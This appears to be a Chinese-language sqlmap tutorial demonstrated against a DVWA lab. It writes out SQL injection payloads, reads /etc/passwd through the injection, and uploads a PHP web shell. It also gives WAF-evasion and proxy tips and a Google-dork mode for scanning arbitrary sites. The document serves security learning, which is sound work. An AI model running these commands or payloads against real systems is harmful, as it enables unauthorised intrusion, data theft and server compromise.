### 1、sqlmap支持的数据库
```yaml
MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
```
### 2、官网地址
```yaml
官方网站: http://sqlmap.org/，
下载地址: https://github.com/sqlmapproject/sqlmap/zipball/master
```
### 3、Mac 或者 Linux下只用git直接下载安装
```shell script
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```
#### 更新
```shell script
Oswald:~ oliver$ cd sqlmap-dev/
Oswald:sqlmap-dev oliver$ git pull
```
### 4、参数Target：
#### 4.1 -u：指定url
```yaml
1、必须带参数：如172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit
            ？后面必须带参数，没有"？+参数"不行带的，至少1个参数
```
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie="PHPSESSID=iepjlmrss0sgkel1rco5p50np4; security=low"
# -p：指定注入的参数是id
# --cookie：指定cookie
```
执行结果
```shell script
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.1.7#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"

[*] starting @ 17:20:21 /2022-01-26/                                    

[17:20:21] [INFO] resuming back-end DBMS 'mysql' 
[17:20:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=123' OR NOT 8112=8112#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=123' AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(5541=5541,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- APwC&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=123' AND (SELECT 5279 FROM (SELECT(SLEEP(5)))ZuPY)-- ZXef&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=123' UNION ALL SELECT CONCAT(0x716b706271,0x6454597779524d6e65754855505750796452624962684b466a535464616f784951474e5574745356,0x716a767171),NULL#&Submit=Submit
---
[17:20:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)  # 系统版本
web application technology: Apache 2.4.10   # 服务是Apache
back-end DBMS: MySQL >= 5.0   # mysql的版本
[17:20:21] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/172.16.120.252'

[*] ending @ 17:20:21 /2022-01-26/
```
#### 4.2 -l：使用BurpSuite的日志，来分析目标日志文件
![image](https://github.com/498946975/Security/blob/master/images/sql_map_1.png)
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -l /Users/oliver/Desktop/test_burpsuite 
```
#### 4.3 -m：从文件中获取多个url目标进行扫描
![image](https://github.com/498946975/Security/blob/master/images/sql_map_2.png)
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -m /Users/oliver/Desktop/test_sql_map_m.txt 
```
#### 4.4 -r：读取一个文本中的HTTP请求，可以跳过设置参数的步骤（如cookie，UA，post的数据等）
![image](https://github.com/498946975/Security/blob/master/images/sql_map_3.png)
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -r /Users/oliver/Desktop/test_sql_map_r.txt 
```
注入结果，和使用的sql语句
```shell script
[16:58:42] [WARNING] GET parameter 'Submit' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 3943 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind   # 布尔盲注
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=123' OR NOT 8112=8112#&Submit=Submit

    Type: error-based     # 报错注入
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=123' AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(5541=5541,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- APwC&Submit=Submit

    Type: time-based blind    # 时间盲注
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=123' AND (SELECT 5279 FROM (SELECT(SLEEP(5)))ZuPY)-- ZXef&Submit=Submit

    Type: UNION query   # 联合注入
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=123' UNION ALL SELECT CONCAT(0x716b706271,0x6454597779524d6e65754855505750796452624962684b466a535464616f784951474e5574745356,0x716a767171),NULL#&Submit=Submit
---
[16:58:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0
[16:58:42] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/172.16.120.252'

[*] ending @ 16:58:42 /2022-01-26/
```
注意处理https请求
```yaml
需要配合这个--force-ssl参数来使用，或者你可以在Host头后面加上:443
```
#### 4.5 -g：sqlmap可以测试注入Google的搜索结果中的GET参数(只获取前100个结果)
结合GoogleHack语法语法，进行搜索注入
```shell script
Oswald:sqlmap-dev oliver$ python sqlmap.py -g "inurl:\".php?id=1\""
# 搜索这个url包含"php?id=1"的前100个
```

### 5、参数Request：请求设置
#### 5.1 参数功能总结
```yaml
 --method:指定请求方法
--data:把数据以POST方式提交 --param:当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数 
--cookie:设置cookie，提交请求的时候附带所设置的cookie
--load-cookies:从文件获取cookie
--user-agent:可以使用–user-anget参数来修改
--headers:可以通过–headers参数来增加额外的http头
--proxy:设置代理
--delay:可以设定两个HTTP(S)请求间的延迟 防止发送过快导致被封ip 
--random-agent:使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为 3或者3以上的时候，会尝试对User-Angent进行注入。 
--referer:在请求目标的时候可以自己伪造请求包中的referer
–-level:参数设定为3或者3以上的时候会尝试对 referer注入。默认是1，等级范围是1～5
```
#### 5.2 设置http请求头的UA，--user-agent
```yaml
一些默认请求的UR一般情况下会被WARF拦截，所以建议更换UA
```
#### 5.3 设置代理，--proxy
```yaml
因为怕自己的ip被WARF干掉，所以在sqlmap扫描的时候，使用--proxy代理，代理的其他的机器上进行操作更安全
```
#### 5.4 随机使用user-agent，--random-agent
```yaml
也是可以绕过WARF的
```
### 6、防止被WARF拦截，或者策略封堵的技巧
```yaml
1、--proxy
2、--random-agent
3、--safe-url
4、--safe-freq
```
### 7、--safe-url，--safe-freq，防止被封堵
```yaml
如果访问一个网址，一直报错（sqlmap就是无限的尝试，所以报错的几率非常高），为了防止被屏蔽掉
1、--safe-url:提供一个安全不错误的连接，每隔一段时间都会去访问一下。 
2、--safe-freq:提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
```
### 8、--scope: 使用正则表达式，对BurpSuite的日志，进行过滤，攻击指定的网址
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -l /Users/oliver/Desktop/test_burpsuite --scope="172.16.120.252"
```
```shell script
扫某个网站的:
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -l /Users/oliver/Desktop/test_burpsuite --scope="(www)?\.某个网站.\(com|net|org)"
```
### 9、--eval，在每次注入的时候，执行python代码
```yaml
应用场景：在注入的时候，有一个参数，假如是md5算出来的值，每次都需要把这个参数，上传给服务器，以达到认证的目的
```
```shell script
python sqlmap.py -u"http://www.target.com/vuln.php? id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```
### 10、-o，开启所有优化开关
### 11、重要参数
```yaml
参数:-b,--banner 大多数的数据库系统都有一个函数可以返回数据库的版本号，
通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
```
```yaml
参数:-current-user
在大多数据库中可以获取到管理数据的用户。
```
```yaml
参数:--current-db
返还当前连接的数据库
```
```yaml
参数:--is-dba
判断当前的用户是否为管理员，是的话会返回True。
```
```yaml
参数:--users
当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
```
### 12、文件系统，读写上传文件等
#### 12.1 读取被攻击数据库的文件，--file-read
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie="PHPSESSID=iepjlmrss0sgkel1rco5p50np4; security=low" --file-read "/etc/passwd"
```
##### 攻击后，读取的文件，保存路径如下
```shell script
 [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0
[11:42:29] [INFO] fingerprinting the back-end DBMS operating system
[11:42:29] [WARNING] reflective value(s) found and filtering out
[11:42:29] [INFO] the back-end DBMS operating system is Linux
[11:42:29] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
[11:42:32] [INFO] the local file '/Users/oliver/.local/share/sqlmap/output/172.16.120.252/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1253 B)  # 文件具体地址
files saved to [1]:
[*] /Users/oliver/.local/share/sqlmap/output/172.16.120.252/files/_etc_passwd (same file)

[11:42:32] [INFO] fetched data logged to text files under '/Users/oliver/.local/share/sqlmap/output/172.16.120.252'   # 文件保存的路径

[*] ending @ 11:42:32 /2022-01-29/
```
##### 查看文件信息
```shell script
Oswald:sqlmap-dev oliver$ cd /Users/oliver/.local/share/sqlmap/output/172.16.120.252/files
Oswald:files oliver$ cat _etc_passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    # dvwa的用户是这个
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
```
#### 12.2 把文件上传到数据库服务器中
```yaml
--file-write：需要上传的文件的本地路径
--file-dest：上传到被攻击的服务器上的路径
```
##### 上传php一句话木马
```shell script
Oswald:sqlmap-dev oliver$ python3 sqlmap.py -u "http://172.16.120.252:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id \
--cookie="PHPSESSID=iepjlmrss0sgkel1rco5p50np4; security=low" \
--file-write="/Users/oliver/Desktop/get_shell.php" \
--file-dest="/var/www/html/get_shell.php"
```
![image](https://github.com/498946975/Security/blob/master/images/sql_map_4.png)